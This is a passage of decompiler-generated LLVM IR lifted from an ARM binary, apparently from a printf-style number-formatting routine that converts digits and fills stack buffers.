  %v2_16984 = add i32 %v1_16984, %v2_16980
  store i32 %v2_16984, i32* %r3.global-to-local, align 4
  %v1_16988 = add i32 %v2_16984, 2
  %v2_16988 = inttoptr i32 %v1_16988 to i8*
  %v3_16988 = load i8, i8* %v2_16988, align 1
  %v4_16988 = zext i8 %v3_16988 to i32
  store i32 %v4_16988, i32* %r2.global-to-local, align 4
  store i32 %v1_16988, i32* %r1.global-to-local, align 4
  %v2_16990 = icmp ugt i8 %v3_16988, 51
  %v7_16990 = icmp eq i8 %v3_16988, 52
  store i1 %v7_16990, i1* %cpsr_z.global-to-local, align 1
  %v2_16994 = xor i1 %v2_16990, true
  %v3_16994 = or i1 %v7_16990, %v2_16994
  br i1 %v3_16994, label %bb218, label %bb219

bb218:                                            ; preds = %dec_label_pc_16980
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb219

bb219:                                            ; preds = %dec_label_pc_16980, %bb218
  %v1_169a088 = phi i32 [ %v1_169a090, %dec_label_pc_16980 ], [ 0, %bb218 ]
  %v2_16998 = xor i1 %v7_16990, true
  %v3_16998 = and i1 %v2_16990, %v2_16998
  br i1 %v3_16998, label %bb220, label %.preheader

bb220:                                            ; preds = %bb219
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb219, %bb220, %.thread137, %._crit_edge85
  %v0_1699c = phi i32 [ %v0_1699c.pre, %._crit_edge85 ], [ %v7_16974134138, %.thread137 ], [ %v1_16988, %bb219 ], [ %v1_16988, %bb220 ]
  %v1_169a0 = phi i32 [ %v1_169a0.pre, %._crit_edge85 ], [ 0, %.thread137 ], [ %v1_169a088, %bb219 ], [ 1, %bb220 ]
  %v1_1699c = add i32 %v0_1699c, -1
  %v2_1699c = inttoptr i32 %v1_1699c to i8*
  %v3_1699c = load i8, i8* %v2_1699c, align 1
  %v4_1699c = zext i8 %v3_1699c to i32
  store i32 %v1_1699c, i32* %r1.global-to-local, align 4
  %v2_169a0 = add i32 %v4_1699c, %v1_169a0
  %v1_169a4 = urem i32 %v2_169a0, 256
  store i32 %v1_169a4, i32* %r3.global-to-local, align 4
  %v2_169a8 = icmp ugt i32 %v1_169a4, 56
  %v7_169a8 = icmp eq i32 %v1_169a4, 57
  store i1 %v7_169a8, i1* %cpsr_z.global-to-local, align 1
  %v2_169ac = xor i1 %v2_169a8, true
  %v3_169ac = or i1 %v7_169a8, %v2_169ac
  br i1 %v3_169ac, label %bb221, label %bb222

bb221:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %.preheader, %bb221
  %v2_169b0 = xor i1 %v7_169a8, true
  %v3_169b0 = and i1 %v2_169a8, %v2_169b0
  br i1 %v3_169b0, label %bb223, label %bb222.bb224_crit_edge

bb222.bb224_crit_edge:                            ; preds = %bb222
  %v1_169b8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb224

bb223:                                            ; preds = %bb222
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %bb222.bb224_crit_edge, %bb223
  %v1_169b8 = phi i32 [ %v1_169b8.pre, %bb222.bb224_crit_edge ], [ 1, %bb223 ]
  %v7_169b4 = icmp eq i32 %v1_169a4, 48
  store i1 %v7_169b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_169b4, label %bb225, label %._crit_edge91

bb225:                                            ; preds = %bb224
  %v2_169b8 = or i32 %v1_169b8, 1
  store i32 %v2_169b8, i32* %r2.global-to-local, align 4
  br label %._crit_edge91

._crit_edge91:                                    ; preds = %bb224, %bb225
  %v0_169bc = phi i32 [ 1, %bb225 ], [ %v1_169b8, %bb224 ]
  %v2_169bc = icmp eq i32 %v0_169bc, 0
  store i1 %v2_169bc, i1* %cpsr_z.global-to-local, align 1
  %v1_169c0 = trunc i32 %v2_169a0 to i8
  store i8 %v1_169c0, i8* %v2_1699c, align 1
  %v0_169c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_169c4, label %dec_label_pc_169c8, label %._crit_edge85

._crit_edge85:                                    ; preds = %._crit_edge91
  %v1_169a0.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_1699c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_169c8:                               ; preds = %._crit_edge91
  store i32 %v2_1696c, i32* %r2.global-to-local, align 4
  %v2_169cc = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_169cc, i32* %r3.global-to-local, align 4
  %v0_169d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_169d0 = icmp uge i32 %v0_169d0, %v2_169cc
  %v9_169d0 = icmp eq i32 %v0_169d0, %v2_169cc
  store i1 %v9_169d0, i1* %cpsr_z.global-to-local, align 1
  %v2_169d4 = xor i1 %v3_169d0, true
  %v3_169d4 = or i1 %v9_169d0, %v2_169d4
  br i1 %v3_169d4, label %bb226, label %.thread142

bb226:                                            ; preds = %dec_label_pc_169c8
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_169cc, i32* %r2.global-to-local, align 4
  store i32 %v2_169cc, i32* %r1.global-to-local, align 4
  br label %.thread142

.thread142:                                       ; preds = %dec_label_pc_169c8, %bb226
  %v2_169f4 = phi i32 [ %v2_169cc, %bb226 ], [ %v0_169d0, %dec_label_pc_169c8 ]
  %v4_169e8141 = phi i32 [ %v2_169cc, %bb226 ], [ %v2_1696c, %dec_label_pc_169c8 ]
  %v2_169e0 = xor i1 %v9_169d0, true
  %v3_169e0 = and i1 %v3_169d0, %v2_169e0
  br i1 %v3_169e0, label %bb227, label %bb228

bb227:                                            ; preds = %.thread142
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %.thread142, %bb227
  br i1 %v3_169d4, label %bb229, label %bb230

bb229:                                            ; preds = %bb228
  %v4_169e4 = load i32, i32* @lr, align 4
  %v5_169e4 = add i32 %v4_169e4, 1
  store i32 %v5_169e4, i32* %r0.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %bb228, %bb229
  br i1 %v3_169e0, label %bb231, label %bb232

bb231:                                            ; preds = %bb230
  %v5_169e8 = add i32 %v4_169e8141, 2
  store i32 %v5_169e8, i32* %r2.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %bb230, %bb231
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_169f0 = load i32, i32* %sb.global-to-local, align 4
  %v7_169f0 = icmp eq i32 %v0_169f0, 103
  store i1 %v7_169f0, i1* %cpsr_z.global-to-local, align 1
  %v3_169f4 = add i32 %v2_169f4, 1
  %v4_169f4 = inttoptr i32 %v3_169f4 to i8*
  store i8 0, i8* %v4_169f4, align 1
  %v0_169f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_169f8 = add i32 %v0_169f8, 1
  store i32 %v1_169f8, i32* %lr.global-to-local, align 4
  %v0_169fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_169fc, label %dec_label_pc_16a00, label %dec_label_pc_16a28

dec_label_pc_16a00:                               ; preds = %bb232
  %v0_16a00 = load i32, i32* %r0.global-to-local, align 4
  %v1_16a00 = load i32, i32* %ip.global-to-local, align 4
  %v2_16a00 = sub i32 %v0_16a00, %v1_16a00
  %v4_16a00 = xor i32 %v1_16a00, %v0_16a00
  %v5_16a00 = xor i32 %v2_16a00, %v0_16a00
  %v6_16a00 = and i32 %v5_16a00, %v4_16a00
  %v7_16a00 = icmp slt i32 %v6_16a00, 0
  %v8_16a00 = icmp slt i32 %v2_16a00, 0
  %v9_16a00 = icmp eq i32 %v0_16a00, %v1_16a00
  %v3_16a04 = xor i1 %v8_16a00, %v7_16a00
  %v4_16a04 = or i1 %v9_16a00, %v3_16a04
  %.254 = zext i1 %v4_16a04 to i32
  store i32 %.254, i32* %r3.global-to-local, align 4
  %v1_16a0c = add i32 %v0_16a00, 4
  %v3_16a0c = sub i32 0, %v0_16a00
  %v4_16a0c = and i32 %v1_16a0c, %v3_16a0c
  %v5_16a0c = icmp slt i32 %v4_16a0c, 0
  %v6_16a0c = icmp slt i32 %v1_16a0c, 0
  %v7_16a0c = icmp eq i32 %v1_16a0c, 0
  store i1 %v7_16a0c, i1* %cpsr_z.global-to-local, align 1
  %v2_16a10 = xor i1 %v6_16a0c, %v5_16a0c
  br i1 %v2_16a10, label %.thread21, label %bb235

.thread21:                                        ; preds = %dec_label_pc_16a00
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d44

bb235:                                            ; preds = %dec_label_pc_16a00
  %v2_16a14 = icmp eq i1 %v4_16a04, false
  store i1 %v2_16a14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a14, label %dec_label_pc_16d44, label %.thread24

.thread24:                                        ; preds = %bb235
  %v3_16a18 = sub i32 %v1_16a00, %v0_16a00
  store i32 %v3_16a18, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16a28:                               ; preds = %bb232
  %v0_16a28 = load i32, i32* %sb.global-to-local, align 4
  %v7_16a28 = icmp eq i32 %v0_16a28, 102
  store i1 %v7_16a28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_16a28, i32* %r8.global-to-local, align 4
  br i1 %v7_16a28, label %dec_label_pc_16a28.dec_label_pc_16a34_crit_edge, label %dec_label_pc_16a44

dec_label_pc_16a28.dec_label_pc_16a34_crit_edge:  ; preds = %dec_label_pc_16a28
  %v0_16a34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %.thread24, %dec_label_pc_16a28.dec_label_pc_16a34_crit_edge
  %v0_16a34 = phi i32 [ %v0_16a34.pre, %dec_label_pc_16a28.dec_label_pc_16a34_crit_edge ], [ %v0_16a00, %.thread24 ]
  %v1_16a34 = icmp slt i32 %v0_16a34, 0
  %v2_16a34 = icmp eq i32 %v0_16a34, 0
  store i1 %v2_16a34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16a34, label %bb236, label %dec_label_pc_16a44

bb236:                                            ; preds = %dec_label_pc_16a34
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_16a3c = load i32, i32* %r2.global-to-local, align 4
  %v6_16a3c = add i32 %v5_16a3c, -1
  %v7_16a3c = inttoptr i32 %v6_16a3c to i8*
  store i8 48, i8* %v7_16a3c, align 1
  %v8_16a3c = load i32, i32* %r2.global-to-local, align 4
  %v9_16a3c = add i32 %v8_16a3c, -1
  store i32 %v9_16a3c, i32* %r2.global-to-local, align 4
  %v0_16a40.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_16a74.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_16a44

dec_label_pc_16a44:                               ; preds = %bb236, %dec_label_pc_16a34, %dec_label_pc_16d44, %dec_label_pc_16a28
  %v1_16a74 = phi i32 [ %v1_169f8, %dec_label_pc_16a28 ], [ %v1_169f8, %dec_label_pc_16d44 ], [ %v1_16a74.pre.pre, %bb236 ], [ %v1_169f8, %dec_label_pc_16a34 ]
  %v1_16aec30 = phi i32 [ 0, %dec_label_pc_16a28 ], [ 0, %dec_label_pc_16d44 ], [ %v0_16a40.pre, %bb236 ], [ %v0_16a34, %dec_label_pc_16a34 ]
  store i32 %v1_16aec30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_16a50 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_16a50, i32* %r3.global-to-local, align 4
  %v0_16a5c = load i32, i32* %r2.global-to-local, align 4
  %v1_16a5c = inttoptr i32 %v0_16a5c to i8*
  %v2_16a5c = load i8, i8* %v1_16a5c, align 1
  %v3_16a5c = zext i8 %v2_16a5c to i32
  store i32 %v3_16a5c, i32* %r3.global-to-local, align 4
  %v5_16a5c = add i32 %v0_16a5c, 1
  store i32 %v5_16a5c, i32* %r2.global-to-local, align 4
  %v1_16a60 = icmp slt i32 %v1_16aec30, 0
  %v2_16a60 = icmp eq i32 %v1_16aec30, 0
  store i1 %v2_16a60, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_16a5c, i32* %r6.global-to-local, align 4
  store i32 %v3_16a5c, i32* %stack_var_-42, align 4
  %v2_16a74 = sub i32 %v1_16a74, %v5_16a5c
  store i32 %v2_16a74, i32* %ip.global-to-local, align 4
  br i1 %v1_16a60, label %.thread, label %dec_label_pc_16a80

.thread:                                          ; preds = %dec_label_pc_16a44
  %v5_16a78 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_16a78, i32* @r7, align 4
  br label %dec_label_pc_16afc

dec_label_pc_16a80:                               ; preds = %dec_label_pc_16a44
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_16a84 = sub i32 %v1_16aec30, %v2_16a74
  %v4_16a84 = xor i32 %v2_16a74, %v1_16aec30
  %v5_16a84 = xor i32 %v2_16a84, %v1_16aec30
  %v6_16a84 = and i32 %v5_16a84, %v4_16a84
  %v7_16a84 = icmp slt i32 %v6_16a84, 0
  %v8_16a84 = icmp slt i32 %v2_16a84, 0
  %v9_16a84 = icmp eq i32 %v1_16aec30, %v2_16a74
  store i1 %v9_16a84, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_16a90 = xor i1 %v8_16a84, %v7_16a84
  br i1 %v2_16a90, label %dec_label_pc_16adc, label %dec_label_pc_16a94

dec_label_pc_16a94:                               ; preds = %dec_label_pc_16a80
  store i32 %v2_16a84, i32* %r2.global-to-local, align 4
  %v2_16a98 = icmp eq i32 %v2_16a84, 0
  store i1 %v2_16a98, i1* %cpsr_z.global-to-local, align 1
  %v2_16a9c = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16a9c, i32* %lr.global-to-local, align 4
  %tmp237 = icmp slt i32 %v2_16a84, 1
  br i1 %tmp237, label %.thread145, label %dec_label_pc_16ab0

.thread145:                                       ; preds = %dec_label_pc_16a94
  %v7_16aa4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_16aa4, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_16ab0:                               ; preds = %dec_label_pc_16a94
  store i32 ptrtoint (i32* @global_var_1b323.473 to i32), i32* %r3.global-to-local, align 4
  %v2_16ac0 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_16ac0, i32* @r7, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_16afc

dec_label_pc_16adc:                               ; preds = %dec_label_pc_16a80
  store i1 %v2_16a60, i1* %cpsr_z.global-to-local, align 1
  %v2_16ae0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16ae0, i32* %lr.global-to-local, align 4
  br i1 %v2_16a60, label %bb238, label %bb239

bb238:                                            ; preds = %dec_label_pc_16adc
  %v3_16ae8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_16ae8, i32* @r7, align 4
  br label %.thread34

bb239:                                            ; preds = %dec_label_pc_16adc
  %v3_16aec = sub i32 %v2_16a74, %v1_16aec30
  store i32 %v3_16aec, i32* %ip.global-to-local, align 4
  %v3_16af063 = add i32 %v5_16a5c, %v1_16aec30
  store i32 %v3_16af063, i32* %r6.global-to-local, align 4
  %v3_16af4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_16af4, i32* @r7, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread145, %bb238, %bb239
  %v1_16b3c261 = phi i32 [ %v3_16ae8, %bb238 ], [ %v3_16af4, %bb239 ], [ %v7_16aa4, %.thread145 ]
  %v0_16b10100 = phi i32 [ %v2_16a74, %bb238 ], [ %v3_16aec, %bb239 ], [ 0, %.thread145 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16afc

dec_label_pc_16afc:                               ; preds = %.thread, %dec_label_pc_16ab0, %.thread34
  %v1_16b3c = phi i32 [ %v2_16ac0, %dec_label_pc_16ab0 ], [ %v1_16b3c261, %.thread34 ], [ %v5_16a78, %.thread ]
  %v0_16b50107 = phi i32 [ -1, %dec_label_pc_16ab0 ], [ -1, %.thread34 ], [ %v1_16aec30, %.thread ]
  %v0_16b10 = phi i32 [ 0, %dec_label_pc_16ab0 ], [ %v0_16b10100, %.thread34 ], [ %v2_16a74, %.thread ]
  %v3_16afc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16afc, i32* %r2.global-to-local, align 4
  %v1_16b00 = add i32 %v3_16afc, 12
  %v2_16b00 = inttoptr i32 %v1_16b00 to i32*
  %v3_16b00 = load i32, i32* %v2_16b00, align 4
  %v1_16b04 = and i32 %v3_16b00, 16
  store i32 %v1_16b04, i32* %r4.global-to-local, align 4
  %v2_16b04 = icmp eq i32 %v1_16b04, 0
  %tmp266 = zext i1 %v2_16b04 to i32
  %.255 = xor i32 %tmp266, 1
  store i32 %.255, i32* %r3.global-to-local, align 4
  %v2_16b10 = icmp eq i32 %v0_16b10, 0
  store i1 %v2_16b10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b10, label %bb242, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_16afc
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16b2c

bb242:                                            ; preds = %dec_label_pc_16afc
  store i1 %v2_16b04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b04, label %dec_label_pc_16b20, label %dec_label_pc_16b2c

dec_label_pc_16b20:                               ; preds = %bb242
  %v0_16b20 = load i32, i32* %sb.global-to-local, align 4
  %v7_16b20 = icmp eq i32 %v0_16b20, 103
  store i1 %v7_16b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b20, label %dec_label_pc_16b50, label %bb243

bb243:                                            ; preds = %dec_label_pc_16b20
  %v1_16b24 = load i32, i32* %fp.global-to-local, align 4
  %v3_16b24 = icmp eq i32 %v1_16b24, 0
  store i1 %v3_16b24, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v1_16b24, 1
  br i1 %tmp244, label %dec_label_pc_16b50, label %dec_label_pc_16b2c

dec_label_pc_16b2c:                               ; preds = %.thread37, %bb242, %bb243
  store i32 add (i32 ptrtoint (i32* @global_var_cdd0.463 to i32), i32 91624), i32* %lr.global-to-local, align 4
  %v2_16b3c = inttoptr i32 %v1_16b3c to i32*
  store i32 112, i32* %v2_16b3c, align 4
  store i32 ptrtoint (i32* @global_var_1b330.474 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_16b48 = load i32, i32* @r7, align 4
  %v1_16b48 = add i32 %v0_16b48, 4
  %v2_16b48 = inttoptr i32 %v1_16b48 to i32*
  store i32 1, i32* %v2_16b48, align 4
  %v4_16b48 = add i32 %v0_16b48, 8
  %v5_16b48 = inttoptr i32 %v4_16b48 to i32*
  %v6_16b48 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_16b48, i32* %v5_16b48, align 4
  %v0_16b4c = load i32, i32* @r7, align 4
  %v1_16b4c = add i32 %v0_16b4c, 12
  store i32 %v1_16b4c, i32* @r7, align 4
  %v0_16b50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b50

dec_label_pc_16b50:                               ; preds = %dec_label_pc_16b20, %bb243, %dec_label_pc_16b2c
  %v1_16b70 = phi i32 [ %v1_16b3c, %bb243 ], [ %v1_16b4c, %dec_label_pc_16b2c ], [ %v1_16b3c, %dec_label_pc_16b20 ]
  %v0_16b50 = phi i32 [ %v0_16b50107, %bb243 ], [ %v0_16b50.pre, %dec_label_pc_16b2c ], [ %v0_16b50107, %dec_label_pc_16b20 ]
  %v1_16b50 = add i32 %v0_16b50, 1
  store i32 %v1_16b50, i32* @lr, align 4
  %v6_16b50 = icmp slt i32 %v1_16b50, 0
  %v7_16b50 = icmp eq i32 %v1_16b50, 0
  store i1 %v7_16b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_16b50, label %dec_label_pc_16b58, label %dec_label_pc_16b7c

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16b50
  store i32 ptrtoint (i32* @global_var_1b323.473 to i32), i32* %r3.global-to-local, align 4
  %v1_16b68 = sub i32 -1, %v0_16b50
  store i32 %v1_16b68, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_16b70 = inttoptr i32 %v1_16b70 to i32*
  store i32 176, i32* %v2_16b70, align 4
  %v0_16b74 = load i32, i32* @r7, align 4
  %v1_16b74 = add i32 %v0_16b74, 4
  %v2_16b74 = inttoptr i32 %v1_16b74 to i32*
  %v3_16b74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_16b74, i32* %v2_16b74, align 4
  %v4_16b74 = add i32 %v0_16b74, 8
  %v5_16b74 = inttoptr i32 %v4_16b74 to i32*
  %v6_16b74 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_16b74, i32* %v5_16b74, align 4
  %v0_16b78 = load i32, i32* @r7, align 4
  %v1_16b78 = add i32 %v0_16b78, 12
  store i32 %v1_16b78, i32* @r7, align 4
  br label %dec_label_pc_16b7c

dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b50, %dec_label_pc_16b58
  %v2_16b84 = phi i32 [ %v1_16b70, %dec_label_pc_16b50 ], [ %v1_16b78, %dec_label_pc_16b58 ]
  %v0_16b7c = load i32, i32* %ip.global-to-local, align 4
  %v2_16b7c = icmp eq i32 %v0_16b7c, 0
  store i1 %v2_16b7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b7c, label %.thread46, label %bb245

bb245:                                            ; preds = %dec_label_pc_16b7c
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_16b84 = inttoptr i32 %v2_16b84 to i32*
  store i32 112, i32* %v3_16b84, align 4
  %v1_16b88 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b88 = load i32, i32* @r7, align 4
  %v3_16b88 = add i32 %v2_16b88, 8
  %v4_16b88 = inttoptr i32 %v3_16b88 to i32*
  store i32 %v1_16b88, i32* %v4_16b88, align 4
  %v1_16b8c = load i32, i32* %ip.global-to-local, align 4
  %v2_16b8c = load i32, i32* @r7, align 4
  %v3_16b8c = add i32 %v2_16b8c, 4
  %v4_16b8c = inttoptr i32 %v3_16b8c to i32*
  store i32 %v1_16b8c, i32* %v4_16b8c, align 4
  %v1_16b90 = load i32, i32* @r7, align 4
  %v2_16b90 = add i32 %v1_16b90, 12
  store i32 %v2_16b90, i32* @r7, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_16b7c, %bb245
  %v1_16bc8 = phi i32 [ %v2_16b84, %dec_label_pc_16b7c ], [ %v2_16b90, %bb245 ]
  %v0_16b94 = load i32, i32* %sb.global-to-local, align 4
  %v7_16b94 = icmp eq i32 %v0_16b94, 103
  store i1 %v7_16b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b94, label %dec_label_pc_16b9c, label %dec_label_pc_16ba4

dec_label_pc_16b9c:                               ; preds = %.thread46
  %v0_16b9c = load i32, i32* %r4.global-to-local, align 4
  %v2_16b9c = icmp eq i32 %v0_16b9c, 0
  store i1 %v2_16b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b9c, label %dec_label_pc_16bd4, label %dec_label_pc_16ba4

dec_label_pc_16ba4:                               ; preds = %.thread46, %dec_label_pc_16b9c
  %v0_16ba4 = load i32, i32* @lr, align 4
  %v1_16ba4 = load i32, i32* %ip.global-to-local, align 4
  %v2_16ba4 = sub i32 %v1_16ba4, %v0_16ba4
  store i32 %v2_16ba4, i32* %r1.global-to-local, align 4
  %v1_16ba8 = load i32, i32* %fp.global-to-local, align 4
  %v2_16ba8 = sub i32 %v2_16ba4, %v1_16ba8
  %v4_16ba8 = xor i32 %v1_16ba8, %v2_16ba4
  %v5_16ba8 = xor i32 %v2_16ba8, %v2_16ba4
  %v6_16ba8 = and i32 %v5_16ba8, %v4_16ba8
  %v7_16ba8 = icmp slt i32 %v6_16ba8, 0
  %v8_16ba8 = icmp slt i32 %v2_16ba8, 0
  %v9_16ba8 = icmp eq i32 %v2_16ba4, %v1_16ba8
  store i1 %v9_16ba8, i1* %cpsr_z.global-to-local, align 1
  %v2_16bac = xor i1 %v8_16ba8, %v7_16ba8
  br i1 %v2_16bac, label %dec_label_pc_16bb0, label %dec_label_pc_16bd4

dec_label_pc_16bb0:                               ; preds = %dec_label_pc_16ba4
  %v2_16bbc = sub i32 %v1_16ba8, %v2_16ba4
  store i32 %v2_16bbc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b323.473 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_16bc8 = inttoptr i32 %v1_16bc8 to i32*
  store i32 176, i32* %v2_16bc8, align 4
  %v0_16bcc = load i32, i32* @r7, align 4
  %v1_16bcc = add i32 %v0_16bcc, 4
  %v2_16bcc = inttoptr i32 %v1_16bcc to i32*
  %v3_16bcc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_16bcc, i32* %v2_16bcc, align 4
  %v4_16bcc = add i32 %v0_16bcc, 8
  %v5_16bcc = inttoptr i32 %v4_16bcc to i32*
  %v6_16bcc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_16bcc, i32* %v5_16bcc, align 4
  %v0_16bd0 = load i32, i32* @r7, align 4
  %v1_16bd0 = add i32 %v0_16bd0, 12
  store i32 %v1_16bd0, i32* @r7, align 4
  br label %dec_label_pc_16bd4

dec_label_pc_16bd4:                               ; preds = %dec_label_pc_16ba4, %dec_label_pc_16b9c, %dec_label_pc_16bb0
  %v1_16c68.pre.pre = phi i32 [ %v1_16bc8, %dec_label_pc_16ba4 ], [ %v1_16bc8, %dec_label_pc_16b9c ], [ %v1_16bd0, %dec_label_pc_16bb0 ]
  %v0_16bd4 = load i32, i32* %r8.global-to-local, align 4
  %v7_16bd4 = icmp eq i32 %v0_16bd4, 102
  store i1 %v7_16bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16bd4, label %dec_label_pc_16c5c, label %dec_label_pc_16bdc

dec_label_pc_16bdc:                               ; preds = %dec_label_pc_16bd4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16be0 = load i32, i32* %r0.global-to-local, align 4
  %v1_16be0 = icmp slt i32 %v0_16be0, 0
  %v2_16be0 = icmp eq i32 %v0_16be0, 0
  store i1 %v2_16be0, i1* %cpsr_z.global-to-local, align 1
  %v4_16be4 = select i1 %tmp270, i32 %v4_16900123127, i32 101
  store i32 %v4_16be4, i32* @r4, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_16bf4 = sub i32 0, %v0_16be0
  %storemerge155 = select i1 %v1_16be0, i32 %v4_16bf4, i32 %v0_16be0
  %tmp267 = ashr i32 %v0_16be0, 31
  %tmp268 = and i32 %tmp267, 2
  %tmp269 = add nuw nsw i32 %tmp268, 43
  store i32 %storemerge155, i32* %r5.global-to-local, align 4
  store i32 %tmp269, i32* %sl.global-to-local, align 4
  %v2_16bfc = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_16bfc, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16c04

dec_label_pc_16c04:                               ; preds = %dec_label_pc_16c34, %dec_label_pc_16c04, %dec_label_pc_16bdc
  %v0_16c04 = phi i32 [ %storemerge155, %dec_label_pc_16bdc ], [ %v0_16c20, %dec_label_pc_16c04 ], [ %v0_16c20, %dec_label_pc_16c34 ]
  store i32 %v0_16c04, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_16c0c = call i32 @function_18dd8(i32 %v0_16c04, i32 10)
  store i32 58, i32* %r3.global-to-local, align 4
  %v0_16c14 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16c14, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v2_16c1c = load i32, i32* %r6.global-to-local, align 4
  %v3_16c1c = add i32 %v2_16c1c, -1
  %v4_16c1c = inttoptr i32 %v3_16c1c to i8*
  store i8 58, i8* %v4_16c1c, align 1
  %v5_16c1c = load i32, i32* %r6.global-to-local, align 4
  %v6_16c1c = add i32 %v5_16c1c, -1
  store i32 %v6_16c1c, i32* %r6.global-to-local, align 4
  %v0_16c20 = call i32 @function_18cac()
  store i32 %v0_16c20, i32* %r0.global-to-local, align 4
  %v0_16c24 = load i32, i32* %r8.global-to-local, align 4
  %v1_16c24 = add i32 %v0_16c24, 1
  store i32 %v1_16c24, i32* %r8.global-to-local, align 4
  %v7_16c28 = icmp eq i32 %v1_16c24, 3
  store i1 %v7_16c28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_16c20, i32* %r5.global-to-local, align 4
  br i1 %v7_16c28, label %dec_label_pc_16c04, label %dec_label_pc_16c34

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c04
  %v2_16c34 = icmp eq i32 %v0_16c20, 0
  store i1 %v2_16c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16c34, label %dec_label_pc_16c3c, label %dec_label_pc_16c04

dec_label_pc_16c3c:                               ; preds = %dec_label_pc_16c34
  %v0_16c3c = load i32, i32* %r6.global-to-local, align 4
  %v1_16c3c = add i32 %v0_16c3c, -1
  store i32 %v1_16c3c, i32* %r3.global-to-local, align 4
